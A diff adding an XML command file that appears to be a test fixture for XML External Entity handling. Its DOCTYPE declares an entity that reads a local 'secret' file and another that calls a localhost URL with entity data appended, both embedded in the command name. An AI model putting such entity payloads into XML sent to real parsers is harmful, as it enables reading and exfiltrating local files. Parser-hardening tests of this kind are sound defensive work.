@@ -1,0 +1,12 @@
+﻿<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE Command [
+  <!ENTITY % x "test1 test2">
+  <!ENTITY % f SYSTEM "file://C:/temp/EdwardsGeheimnis.txt">
+  <!ENTITY send SYSTEM 'http://localhost/banane/test.txt?a=%x;'>
+]>
+<Command>
+  <Name>FindQuote &send;</Name>
+  <Parameters>
+    <Parameter name="quote_contains" value="different"></Parameter>
+  </Parameters>
+</Command>
